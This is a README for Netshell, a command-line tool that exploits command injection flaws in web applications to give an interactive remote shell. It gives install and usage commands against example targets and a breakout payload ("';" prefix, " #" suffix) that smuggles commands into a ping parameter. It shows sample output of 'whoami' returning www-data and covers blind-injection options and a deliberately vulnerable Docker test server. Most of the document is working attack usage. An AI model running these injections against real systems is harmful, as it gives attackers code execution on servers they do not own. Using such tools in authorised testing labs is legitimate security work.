# Netshell

A lightweight HTTP CLI Shell that enables custom command injection into vulnerable web applications with a familiar shell-like interface.

## Installation

Install using pip:

```sh
pip install netshell
```

or manually by downloading the git repository:

```sh
git clone https://github.com/dubniczky/Netshell
```

## Usage

### Simple injection

The `q` query parameter of `http://example.com/vln.php` is vulnerable to command injections, then the following command connects to it and starts a shell-like environment:

In this example the value of the `q` parameter is ran as a command.

```sh
httpshell -a http://example.com/vln.php -p q
```
```txt
Connection successful!

example.com > whoami
www-data
```

### Breakout injection

If the value of the parameter is embedded into a command and have to break out, then the `--prefix`, `--suffix` parameters define a stable environment for the shell. For example with the ping command:

```sh
ping -c '{IP_PARAMETER_INSERTED_HERE}'
```

to break out, the command has to start with `';` and end with ` #`:

```sh
ping -c '' whoami #'
```

I recommend testing this manually using a tool such as curl with a simple command like `whoami`, then starting netshell with the prefix and suffix set.

> ⚠️ Please note that the values in the `--prefix` and `--suffix` fields are also URL encoded if URL encoding is not disabled. If you are encoding it manually, you can use this tool: https://convert.dubniczky.com/?from=text&to=url

```sh
netshell -a http://example.com/ping.php -p ip -P "';" -S " #"
```


## Reference

Use `httpshell --help` for all flags and options.

Command line options:
- `-h`, `--help` - show this help message and exit
- `--address`, `-a` _ADDRESS_ Target address containing the full path. E.g., http://example.com/vulnerable.php
- `--parameter`, `-p` _PARAMETER_ Parameter name where the injection will occur. E.g., 'cmd' for http://example.com/vulnerable.php?cmd=...
- `--cookies`, `-c` _COOKIES_ Use cookies for the request
- `--agent` _AGENT_ Set a custom User-Agent header for the requests
- `--prefix`, `-P` _PREFIX_ Set a custom prefix for the commands. This is usually the command escape. By default there is none. No modifications apply to this, so make sure to encode it properly if needed.
- `--suffix`, `-S` _SUFFIX_   Set a custom suffix for the commands. This is usually the command escape. By default there is none. No modifications apply to this, so make sure to encode it properly if needed.
- `--blind`, `-b` Enable blind command execution (no output returned). The preflight checks will be adapted to detect blind command execution based on response times.
- `--verbose`, `-v` Verbose output
- `--no-url-encode` Disable URL encoding of commands
- `--no-preflight` Skip preflight checks and go straight to the shell interface

## Testing

The `/test` folder contains a simple injectable web server that can be started using Docker Compose.

```sh
cd test
docker compose up --build
```

The injectable point is at `/good` path with the `p` query parameter.


```sh
netshell -a http://localhost:8000/good -p q
```

A breakout injection point with the ping command `ping -c 1 '<ip>'` is on the `/ping` path with the `ip` query parameter.

```sh
netshell -a http://localhost:8000/ping -p ip -P "';" -S " #"
```

A blind command injection point inside an echo command `echo "<t>"`. 

```sh
netshell -a http://127.0.0.1:8000/blind -p t --blind -P "\";" -S " #"
```